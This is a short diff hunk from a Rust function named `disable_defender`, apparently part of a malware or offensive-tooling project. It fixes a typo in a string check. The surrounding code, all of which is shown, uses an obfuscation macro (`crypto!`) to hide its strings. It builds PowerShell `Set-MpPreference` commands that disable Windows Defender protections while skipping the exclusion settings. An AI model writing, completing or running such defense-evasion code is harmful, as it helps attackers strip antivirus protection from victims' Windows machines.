@@ -59,7 +59,7 @@ pub fn disable_defender() -> anyhow::Result<()> {
         } else if line.starts_with(&crypto!("ExclusionExtension")) {
         } else if line.starts_with(&crypto!("ExclusionIpAddress")) {
         } else if line.starts_with(&crypto!("ExclusionPath")) {
-        } else if line.starts_with(&crypto!("EXclusionProcess")) {
+        } else if line.starts_with(&crypto!("ExclusionProcess")) {
         } else {
             let true_line: Vec<&str> = line.split(" ").collect();
             let action = format!("Set-MpPreference -{} $true", true_line.first().context("")?);
